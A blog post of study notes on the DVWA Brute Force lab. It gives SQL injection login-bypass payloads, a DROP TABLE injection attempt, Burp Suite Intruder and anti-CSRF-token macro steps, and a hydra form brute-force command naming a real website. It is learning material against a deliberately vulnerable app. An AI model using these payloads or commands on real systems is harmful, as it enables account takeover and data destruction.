---
layout: post
title: "Brute Force"
date: 2020-07-03T22:26:03+08:00
---

<https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php>

## Low

### Code

```
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```

No filter of user inputs, we can have two ways to bypass the password check.

### SQL Injection

<https://www.w3schools.com/sql/sql_injection.asp>

If we know the user name, we can fill in 

- user: `admin' or '' = '`.

```
    $query  = "SELECT * FROM `users` WHERE user = 'admin' or ''='' AND password = '$pass';";
```

If we do not know the user name, we can fill in 

- user: `' or 1 = 1 limit 1 #`.
- user: `' or 1 = 1 limit 1 -- `.

```
    $query  = "SELECT * FROM `users` WHERE user = '' or 1 = 1 limit 1 #' AND password = '$pass';";
```

We failed to do something like:

- user: `' or ''='';  DROP TABLE Persons; #`

```
    $query  = "SELECT * FROM `users` WHERE user = ''; DROP TABLE Persons; #' AND password = '';";
```

<https://www.php.net/manual/en/mysqli.quickstart.multiple-statement.php>

> The API functions mysqli_query() and mysqli_real_query() do not set a connection flag necessary for activating multi queries in the server. An extra API call is used for multiple statements to reduce the likeliness of accidental SQL injection attacks. An attacker may try to add statements such as ; DROP DATABASE mysql or ; SELECT SLEEP(999). If the attacker succeeds in adding SQL to the statement string but mysqli_multi_query is not used, the server will not execute the second, injected and malicious SQL statement.

## Medium

### Code

```
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```

We can write our own script (e.g., using python) or use the Burp Suite, together with a password dictionary.

### Common Passwords

<https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt>

### Burp Suite 

#### Proxy

<https://portswigger.net/burp/documentation/desktop/tools/proxy/options>

##### HTTPS

<https://cloud.tencent.com/developer/news/288748>

> 打开这个证书文件，根据提示安装这个证书，基本上是一路『下一步』，唯一需要注意的是，在『证书存储』这一步选择将证书存储在『受信任的根证书颁发机构』。

##### localhost

We can use ip address from `ipconfig` rather than `127.0.0.1` to let Burp Suite log the local requests.

#### Intruder

<https://portswigger.net/support/analyzing-burp-intruder-attack-results>

## High

### Code

```
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

### CSRF

<https://portswigger.net/web-security/csrf/tokens>

### Burp Suite

#### Macro 

<https://portswigger.net/support/using-burp-suites-session-handling-rules-with-anti-csrf-tokens>

<https://www.youtube.com/watch?v=GWLMmkv3z38>


#### regex

```
			<input type="password" AUTOCOMPLETE="off" name="password"><br />
			<br />
			<input type="submit" value="Login" name="Login">
			<input type='hidden' name='user_token' value='91c32cd7d7e731f7874c0a42046b4ec0' />
```

```
name='user_token' value='(.*?)'
```

## More

### OWASP

<https://wiki.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)>

### hydra

<http://www.sillychicken.co.nz/2011/05/how-to-brute-force-http-forms-in-windows/>

```
hydra -l hydra -P password.lst -s 80 -f www.sillychicken.co.nz http-post-form "/administrator/index.php:usrname=^USER^&pass=^PASS^&submit=Login:Incorrect Username"
```

> hydra –> The hydra program
> -l –> (lower case “L” not to be confused with a upper case i) single username to target. Use uppercase -L to specify a username list) i have setup the “hydra” account for this demo and has already been deleted
> -P –> Provide path to password lis. -p to try a single password ie “passw0rd”
> -s –> Port to target default port for http is 80
> -f –> Exits the program after the first match is made
> {Site Address} I.E www.sillychicken.com. Do not include http://
> http-post-form –> service to brute force. Hydra README has the command as http-form-post       using that will give you an error
> {Path to postback page} everything after the site address must start with “/”
> {USERNAME_NAME} –> the name of the username postback variable
> ^USER^ –> this will be replaced with the username specified by -l or -L username list
> ^PASS^ –> this will be replaced with the password from the defined list
> {Failed login text} –> text that will only be found in a failed login